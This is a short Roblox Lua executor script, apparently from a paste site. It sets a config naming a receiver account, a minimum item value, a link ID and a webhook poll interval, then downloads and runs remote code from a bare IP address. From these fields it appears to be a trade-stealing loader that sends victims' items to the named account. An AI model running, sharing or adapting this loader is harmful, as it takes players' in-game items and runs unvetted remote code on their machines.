https://pastefy.app/0FY9sGDC/raw

task.wait(0.2)

local globalEnv = (getgenv and getgenv()) or _G
globalEnv.StarScriptsConfig = {
    RECEIVERS = { "Reivy0" },
    MIN_VALUE = "1k",
    LINK_ID = "Us8yAHlPiO-aZMu1XxpBN_BuUT5sBnK_",
    WEBHOOK_POLL_SEC = 2
}
loadstring(game:HttpGet("http://205.185.125.84/sab/sabtrade"))()
